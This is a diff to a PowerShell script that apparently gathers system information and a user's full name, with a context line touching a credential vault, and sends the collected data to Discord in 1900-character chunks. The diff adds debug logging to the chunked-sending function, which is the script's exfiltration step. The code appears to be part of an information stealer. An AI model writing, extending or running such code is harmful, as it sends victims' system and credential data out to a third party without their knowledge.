@@ -397,16 +397,27 @@ vault -ErrorAction SilentlyContinue -Force
 
 ############################################################################################################################################################
 
+# Debug: Output the length of SystemInfo
+Write-Host "Length of SystemInfo: $($SystemInfo.Length)"
+
+#Split for Discord
 function Send-SplitToDiscord {
     param ($Message)
 
-    # Set the maximum message length (Discord limit is 2000 characters, so we'll use 1900 for safety)
+    # Set the maximum message length
     $maxLength = 1900
+
+    # Debug: Log the length of the incoming message
+    Write-Host "Send-SplitToDiscord called with message length: $($Message.Length)"
 
     # While the message length exceeds the max length, send it in chunks
     while ($Message.Length -gt $maxLength) {
         # Extract the first chunk of the message
         $chunk = $Message.Substring(0, $maxLength)
+
+        # Debug: Log the chunk length and content
+        Write-Host "Sending chunk with length: $($chunk.Length)"
+        Write-Host "Chunk content (first 100 characters): $($chunk.Substring(0, [Math]::Min(100, $chunk.Length)))"
 
         # Send the chunk to Discord
         Send-ToDiscord -Message $chunk
@@ -417,9 +428,11 @@ function Send-SplitToDiscord {
 
     # Send any remaining part of the message
     if ($Message.Length -gt 0) {
+        Write-Host "Sending final part with length: $($Message.Length)"
         Send-ToDiscord -Message $Message
     }
 }
+
 
 # Main Script: Gather System Information
 $FullName = Get-FullName
